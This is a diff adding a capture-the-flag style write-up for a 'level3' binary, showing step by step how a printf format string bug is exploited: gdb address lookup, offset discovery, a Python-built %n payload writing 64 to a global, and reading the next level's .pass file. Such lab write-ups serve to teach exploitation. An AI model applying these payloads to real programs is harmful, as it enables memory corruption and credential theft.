@@ -1,0 +1,32 @@
+- After running the program, we found that it read from the stdin.
+
+- we found there is  global variable called m with 0 as initial value and a function named v()
+
+- The program calls 4 C functions (fgets, printf, fwrite, system) and the compare the value to m varible to  0x40 = 64.
+
+- as the program uses fgets to read the stdin so it's protected from buffer overflow, but it's pass the returned value to the printf function.
+
+- In the manual page of printf we found this in the bugs section:
+Code such as printf(foo); often indicates a bug, since foo may contain a % character. If foo comes from untrusted user input, it may contain %n, causing the printf() call to write to memory and creating a security hole.
+
+- So we will exploit the program via the printf function with "Format String Vulnerability Exploitation" (https://www.exploit-db.com/papers/23985)
+
+- We need in the first to extract the address of the m variable.
+
+(gdb) info var
+Non-debugging symbols:
+[...]
+0x0804988c  m
+
+- We need to get the offset.
+
+$> ./level3
+AAAA %p %p %p %p %p
+AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520
+
+- So the offset is 4, Now we need to make the payload for exploiting.
+
+$> python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/payload
+
+$> cat /tmp/payload - | ./level3
+> cat /home/user/level4/.pass
